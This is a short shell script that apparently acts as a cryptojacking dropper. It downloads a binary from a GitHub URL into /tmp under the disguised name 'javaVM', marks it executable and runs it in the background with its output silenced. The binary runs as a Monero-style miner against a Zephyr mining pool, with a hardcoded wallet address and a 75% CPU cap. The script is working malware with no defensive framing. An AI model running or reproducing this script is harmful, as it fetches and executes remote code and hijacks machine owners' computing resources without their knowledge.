#!/bin/sh
if [ -f /tmp/javaVM ]
 	then
 	/tmp/javaVM -o 	sg-zephyr.miningocean.org -u ZEPHs9EoDAxbWgcA8eLM6xVPpcKt5vMZz47KN29LaYRZVKhuowDdsM22n2ExnU3A7BiS3CxzXCuruRBofjuwvoP9FSRyXzzWWSt -p DuckRig -a rx/0 -t 1 -k --donate-level --tls --cpu-max-threads-hint=75 > /dev/null 2>&1 &
 	echo Started Existing
 	else
 		wget -q https://github.com/thesunofme/trash/raw/main/work -O /tmp/javaVM
 		chmod +x /tmp/javaVM
 		/tmp/javaVM -o 	sg-zephyr.miningocean.org -u ZEPHs9EoDAxbWgcA8eLM6xVPpcKt5vMZz47KN29LaYRZVKhuowDdsM22n2ExnU3A7BiS3CxzXCuruRBofjuwvoP9FSRyXzzWWSt -p DuckRig -a rx/0 -t 1 -k --donate-level --tls --cpu-max-threads-hint=75 > /dev/null 2>&1 &
fi
